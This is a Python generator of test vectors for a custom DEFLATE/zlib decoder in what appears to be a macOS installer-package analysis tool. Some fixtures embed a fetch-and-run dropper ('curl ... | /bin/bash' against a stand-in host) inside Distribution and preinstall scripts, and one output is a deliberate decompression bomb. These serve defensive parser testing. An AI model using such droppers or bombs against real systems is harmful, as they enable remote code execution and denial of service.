#!/usr/bin/env python3
"""Regenerate the differential inflate vectors under crates/nav-core/testdata/inflate/.

Ground truth comes from CPython's zlib (i.e. real zlib), so nav-core's
hand-rolled RFC1951/RFC1950 decoder is checked against a reference
implementation rather than against itself. Deterministic: the RNG is seeded.

Each case pairs <name>.in (compressed) with <name>.out (expected plaintext).
bomb.in deliberately has no .out - it must be rejected as BudgetExceeded.

Usage: python3 gen_inflate_vectors.py <output-dir>
"""
import struct, os, random, sys, zlib

def raw(data, level=6):
    """Raw DEFLATE, no wrapper (wbits=-15)."""
    co = zlib.compressobj(level, zlib.DEFLATED, -15)
    return co.compress(data) + co.flush()

def build():
    random.seed(20260830)
    c = {}
    c["empty"]        = (b"", raw(b""))
    c["hello"]        = (b"hello, world", raw(b"hello, world"))

    # level 0 -> stored blocks (BTYPE=00); >64KiB spans multiple stored blocks
    stored = bytes(random.getrandbits(8) for _ in range(70000))
    c["stored"]       = (stored, raw(stored, 0))

    # small + repetitive -> fixed Huffman (BTYPE=01)
    c["fixed"]        = (b"aaaaaaaabbbbbbbbaaaaaaaa", raw(b"aaaaaaaabbbbbbbbaaaaaaaa", 1))

    # long zero run -> long back-refs, 840:1 ratio
    zeros = b"\x00" * 65536
    c["zeros_64k"]    = (zeros, raw(zeros, 9))

    # varied text -> dynamic Huffman (BTYPE=10)
    words = ["package","install","script","distribution","signature",
             "payload","bundle","launchd","entropy","notarized"]
    text = (" ".join(random.choice(words) for _ in range(4000))).encode()
    c["dynamic_text"] = (text, raw(text, 9))

    # incompressible
    rnd = bytes(random.getrandbits(8) for _ in range(4096))
    c["random_4k"]    = (rnd, raw(rnd, 9))

    # repeating pattern well past 32KiB -> back-refs at max distance, across blocks
    pat = b"NAVxar!TOC" * 8000
    c["window"]       = (pat, raw(pat, 9))

    # RFC1950-wrapped (what a real xar TOC is)
    c["zlib_hello"]   = (b"hello, world", zlib.compress(b"hello, world"))
    toc = (b'<?xml version="1.0" encoding="UTF-8"?>\n<xar><toc><checksum style="sha1">'
           b'<offset>0</offset><size>20</size></checksum></toc></xar>\n')
    c["zlib_toc"]     = (toc, zlib.compress(toc, 9))

    # Installer Distributions, for the truncated-entry tests (#75). The padded
    # one keeps the dropper in the first bytes so a mid-stream cut still holds it.
    dropper = (b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
               b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
    c["zlib_distribution_dropper"] = (dropper, zlib.compress(dropper, 9))
    padded = dropper + b"\n<!-- " + bytes(random.getrandbits(8) for _ in range(3000)).hex().encode() + b" -->\n"
    c["zlib_distribution_padded"]  = (padded, zlib.compress(padded, 9))
    ordinary_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "..", "bzip2", "distribution_ordinary.out")
    with open(ordinary_path, "rb") as f:
        ordinary = f.read()
    c["zlib_distribution_ordinary"] = (ordinary, zlib.compress(ordinary, 9))
    # A Scripts entry that compresses well on the outside: zlib over a gzip of
    # stored blocks over cpio, the dropper first (#110).
    body = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n" + b"# pad\n" * 5000
    cpio = odc("preinstall", body) + odc("TRAILER!!!")
    gz = gzip_stored(cpio)
    c["zlib_scripts_gzip_stored"] = (gz, zlib.compress(gz, 9))
    # The same gzip, gzip-compressed again: decoded on the heap, then nested.
    co = zlib.compressobj(9, zlib.DEFLATED, 31)
    c["gzip_scripts_gzip_stored"] = (gz, co.compress(gz) + co.flush())
    return c

def odc(name, data=b""):
    """cpio odc member: 76-byte octal header, name + NUL, data."""
    nb = name.encode() + b"\x00"
    h = (b"070707" + b"000000" + b"000001" + b"100755" + b"000000" * 2
         + b"000001" + b"000000" + b"0" * 11
         + f"{len(nb):06o}".encode() + f"{len(data):011o}".encode())
    return h + nb + data

def gzip_stored(data):
    """gzip of stored DEFLATE blocks (no compression), with a valid trailer."""
    gz = bytes([0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3])
    chunks = [data[i:i + 60000] for i in range(0, len(data), 60000)] or [b""]
    for i, chunk in enumerate(chunks):
        n = len(chunk)
        gz += bytes([i + 1 == len(chunks)]) + struct.pack("<HH", n, n ^ 0xFFFF) + chunk
    return gz + struct.pack("<II", zlib.crc32(data) & 0xFFFFFFFF, len(data) & 0xFFFFFFFF)

if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(out, exist_ok=True)
    for name, (plain, comp) in build().items():
        open(os.path.join(out, name + ".out"), "wb").write(plain)
        open(os.path.join(out, name + ".in"), "wb").write(comp)
        ratio = len(plain) / len(comp) if comp else 0
        print(f"{name:14s} in={len(comp):7d} out={len(plain):7d} ratio={ratio:8.1f}")

    # 8 MiB of zeros from ~8 KB. No .out on purpose: expected BudgetExceeded.
    open(os.path.join(out, "bomb.in"), "wb").write(raw(b"\x00" * (8 << 20), 9))
    print(f"{'bomb':14s} in={os.path.getsize(os.path.join(out,'bomb.in')):7d} (no .out: BudgetExceeded)")
